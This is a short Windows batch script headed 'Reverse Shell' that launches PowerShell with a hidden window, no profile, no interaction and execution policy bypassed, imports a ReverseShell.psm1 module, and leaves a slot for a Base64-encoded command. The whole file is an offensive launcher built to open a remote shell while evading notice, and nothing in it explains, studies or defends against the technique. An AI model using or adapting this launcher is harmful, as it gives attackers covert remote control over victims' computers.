@echo off;
REM Reverse Shell
PowerShell -NoP -NonI -W Hidden -Exec Bypass -Command "& {Import-Module ../Modules/ReverseShell.psm1}"
PowerShell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand "" REM <- Base64 encoded command within the quotes
